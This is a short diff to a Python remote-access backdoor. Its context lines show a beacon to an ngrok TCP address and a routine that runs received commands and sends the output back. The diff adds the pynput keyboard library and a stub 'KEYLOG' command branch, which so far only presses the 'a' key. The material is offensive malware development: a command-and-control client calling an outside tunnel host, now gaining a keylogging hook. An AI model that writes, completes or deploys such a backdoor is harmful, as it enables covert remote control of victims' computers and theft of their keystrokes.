@@ -11,6 +11,7 @@ import time
 import threading
 import subprocess
 import base64
+from pynput import keyboard
 
 # If the free version of ngrok is used, the port will change each time ngrok is activated
 address = "0.tcp.jp.ngrok.io" # address
@@ -57,6 +58,9 @@ def send_beacon(sock):
 # Postconditions: The command is executed and the output is sent back to the user 
 def execute_command(command, sock):
     try:
+        #Keylogging command
+        if command.startswith("KEYLOG"):
+          keyboard.press('a')
         # Special handling for "cd" command
         if command.startswith("cd "):
             try:
